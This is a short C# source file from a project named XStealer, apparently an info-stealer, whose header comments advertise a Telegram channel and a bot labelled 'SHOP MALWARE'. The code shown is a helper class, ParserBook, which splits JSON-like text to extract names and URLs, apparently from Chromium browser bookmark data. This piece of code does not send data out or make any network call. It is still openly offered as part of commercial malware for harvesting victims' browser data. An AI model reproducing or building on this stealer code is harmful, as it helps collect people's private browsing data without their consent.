// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.Text.RegularExpressions;

    public static class ParserBook
    {
        public static string separator = "\": \"";

        public static string RemoveLatest(string data)
        {
            string result = string.Empty;
            try
            {
                result = Regex.Split(Regex.Split(data, "\",")[0], "\"")[0];
            }
            catch { }
            return result;
        }

        public static bool DetectTitle(string data) => data.Contains("\"name");

        public static string Get(string data, int index)
        {
            try
            {
                return RemoveLatest(Regex.Split(data, separator)[index]);
            }
            catch (Exception) { return "Failed to parse url"; }
        }
    }
}